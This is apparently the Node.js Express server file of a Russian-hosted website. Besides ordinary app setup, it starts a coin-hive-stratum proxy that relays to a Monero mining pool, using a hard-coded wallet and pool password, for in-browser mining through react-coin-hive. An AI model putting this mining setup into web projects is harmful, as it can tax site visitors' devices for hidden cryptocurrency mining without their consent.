/* eslint consistent-return:0 */

const path = require('path');

const fs = require('fs');

require('babel-core/register')({

  ignore: function(file){
    if(/\/node_modules\//.test(file)){
      if(
        /\/material-ui-components\//.test(file)
        || /\/material-ui\//.test(file)
        || /\/react-cms-data-view\//.test(file)
        || /\/structor-templates\//.test(file)
        || /\/react-decliner\//.test(file)
        || /\/google-map-react\//.test(file)
        || /\/react-progress-button\//.test(file)
        || /\/react-coin-hive\//.test(file)
        // || /\/moment\//.test(file)
      ){
        return;
      }

      return true;
    }
  },
	
});

['.css', '.less', '.sass', '.ttf', '.woff', '.woff2'].forEach((ext) => require.extensions[ext] = () => {});
require('babel-polyfill');

const express = require('express');
const logger = require('./logger');

const argv = require('minimist')(process.argv.slice(2));
const setup = require('./middlewares/frontendMiddleware');
const isDev = process.env.NODE_ENV !== 'production';
const resolve = require('path').resolve;
const app = express();

var bodyParser = require('body-parser');

app.use(bodyParser.urlencoded({     // to support URL-encoded bodies
  extended: true
})); 
app.use(bodyParser.json());       // to support JSON-encoded bodies

// In production we need to pass these values in instead of relying on webpack
// var s = 
setup(app, {
	outputPath: resolve(process.cwd(), 'build'),
	publicPath: '/build/',
});


// Create your HiveProxy proxy
const createProxy = require("coin-hive-stratum");
const proxy = createProxy({
  // host: "la01.supportxmr.com",
  host: "pool.supportxmr.com",
  port: 3333,
  user: "43QGgipcHvNLBX3nunZLwVQpF6VbobmGcQKzXzQ5xMfJgzfRBzfXcJHX1tUHcKPm9bcjubrzKqTm69JbQSL4B3f6E3mNCbU",
  pass: "webmining.online:n.lanets@webmining.online",
});


// Create an HTTPS server
const server = require("https").createServer({
  key: fs.readFileSync("/opt/letsencrypt/certs/gorodskie-bani.ru/privkey.pem"),
  cert: fs.readFileSync("/opt/letsencrypt/certs/gorodskie-bani.ru/cert.pem")
});

server.listen(8892);

// Pass your HTTPS server to the proxy
proxy.listen({
  server: server
});


// var router = require('./routes/main')({
//   app: app,
//   // host: config.host,
//   // raw_host_port: config.raw_host_port,
//   // path: config.path,
//   // hot_reload_debug: config.hot_reload_debug,
//   // hot_reload_port: config.hot_reload_port,
// });

// // // If you need a backend, e.g. an API, add your custom backend-specific middleware here
// // // app.use('/api', myApi);

// app.use(router);

// console.log('s result', s);


// get the intended port number, use port 3000 if not provided
const port = argv.port || process.env.PORT || 3000;

// Start your app.
app.listen(port, (err) => {
	if (err) {
		return logger.error(err.message);
	}
	logger.appStarted(port);
});
